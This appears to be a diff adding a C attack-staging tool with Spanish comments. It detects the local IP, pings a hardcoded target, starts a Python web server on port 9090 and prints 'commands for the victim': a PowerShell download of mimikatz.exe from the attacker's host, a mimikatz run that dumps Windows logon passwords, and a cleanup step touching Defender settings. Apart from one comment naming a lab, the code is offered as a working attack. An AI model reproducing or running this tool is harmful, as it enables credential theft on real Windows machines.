@@ -1,0 +1,65 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+
+#define PORT 9090
+#define TARGET_IP "192.168.1.11" // Ajusta según tu lab de Naucalpan
+
+// --- Lógica de Red ---
+char* get_active_ip() {
+    int fd;
+    struct ifreq ifr;
+    static char ip[16];
+    const char* ifaces[] = {"tun0", "wlan0", "rmnet_data0"};
+    
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    for(int i=0; i<3; i++) {
+        strncpy(ifr.ifr_name, ifaces[i], IFNAMSIZ-1);
+        if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
+            strcpy(ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
+            close(fd);
+            return ip;
+        }
+    }
+    close(fd); return NULL;
+}
+
+// --- Verificador de Conectividad ---
+int check_target(const char* target) {
+    char cmd[64];
+    sprintf(cmd, "ping -c 1 -W 1 %s > /dev/null 2>&1", target);
+    return system(cmd);
+}
+
+int main() {
+    char* my_ip = get_active_ip();
+    if (!my_ip) return 1;
+
+    printf("\033[1;32m[+] NEXUS REVOLUTION INICIADO\033[0m\n");
+    printf("[*] IP Local: %s | Objetivo: %s\n", my_ip, TARGET_IP);
+
+    // Verificación de conectividad
+    if (check_target(TARGET_IP) == 0) {
+        printf("[+] Objetivo alcanzable. Procediendo...\n");
+    } else {
+        printf("\033[1;31m[!] Alerta: El objetivo no responde a PING.\033[0m\n");
+    }
+
+    // Limpieza y Lanzamiento
+    system("fuser -k 9090/tcp > /dev/null 2>&1");
+    system("python3 -m http.server 9090 > /dev/null 2>&1 &");
+
+    printf("\n\033[1;34m--- COMANDOS PARA LA VÍCTIMA ---\033[0m\n");
+    printf("1. DESCARGA:\n powershell -c \"iwr -uri http://%s:%d/mimikatz.exe -outfile m.exe\"\n", my_ip, PORT);
+    printf("\n2. EJECUCIÓN:\n .\\m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n");
+    printf("\n3. LIMPIEZA TOTAL:\n del m.exe & Set-MpPreference -DisableRealtimeMonitoring $false\n");
+    printf("\033[1;34m--------------------------------\033[0m\n");
+
+    return 0;
+}
